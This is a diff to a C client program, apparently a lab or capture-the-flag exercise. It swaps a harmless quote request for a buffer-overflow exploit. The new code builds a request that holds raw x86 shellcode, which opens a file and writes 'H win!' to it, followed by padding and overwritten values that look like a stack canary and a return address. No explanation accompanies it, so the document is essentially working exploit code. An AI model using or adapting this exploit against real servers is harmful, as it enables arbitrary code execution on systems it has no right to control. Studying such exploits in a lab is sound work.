@@ -25,10 +25,28 @@
 
 int main(int argc, char** argv)
 {
-	char reqstring[1000] =
+/*	char reqstring[1000] =
 		"1|The cure for boredom is curiosity."
 		" There is no cure for curiosity."
 		" --Dorothy Parker";
+*/	
+	char reqstring[1000] = "1|\xeb\x2b\x31\xd2\x31\xc9\x31\xc0\x66\xba\x24\x01\xb1\x42\x5b\x83\x6b\x07\x01\x83\x43\x08\x01\xb0\x05\xcd\x80\x31\xd2\x31\xc9\xb2\x06\x80\xc3\x08\x89\xd9\x89\xc3\xb0\x04\xcd\x80\xc3\xe8\xd0\xff\xff\xff\x62\x61\x72\x2e\x74\x78\x74\x01\x48\x20\x77\x69\x6e\x21";
+	int injectlen = 0;
+	while(injectlen<=377){
+		if(reqstring[injectlen] == 0){
+			reqstring[injectlen]='I';		
+		}	
+		injectlen++;
+	}
+	strcpy(&reqstring[378],"\xfe\xca\xde\xde");
+	injectlen = 382;
+	while(injectlen<=397){
+		if(reqstring[injectlen] == 0){
+			reqstring[injectlen]='I';		
+		}	
+		injectlen++;
+	}
+	strcpy(&reqstring[398],"\x98\x6b\x48\x55");
 
 	int PORTNUM;
 	char SERVER_IP[16];
@@ -39,7 +57,7 @@ int main(int argc, char** argv)
 	struct sockaddr_in srv;
  
 	/* Set up some defaults for if you don't enter any parameters */ 
-	PORTNUM = 23781;
+	PORTNUM = 18732;
 	strcpy(SERVER_IP, "127.0.0.1");	
 
 	printf("\nUsage: client [-port <port_number>] [-server <server_IP>]\n");
